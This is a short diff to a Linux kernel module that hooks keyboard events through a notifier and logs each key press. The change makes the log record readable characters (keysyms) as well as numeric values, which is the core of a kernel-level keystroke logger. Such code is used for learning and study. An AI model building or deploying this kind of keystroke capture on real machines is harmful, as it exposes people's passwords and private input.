@@ -12,11 +12,11 @@ MODULE_VERSION("0.1");
 static int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p)
 {
 	struct keyboard_notifier_param *param = p;
-   	if(kcode == KBD_KEYCODE){
+   	if(kcode == KBD_KEYSYM){
 
 		   if(param->down)
 		   {
-			   printk(KERN_INFO "KEY %d PRESSED !", param->value);
+			   printk(KERN_INFO "KEY %d (%c) PRESSED !", param->value, param->value);
 		   }
 
 	}
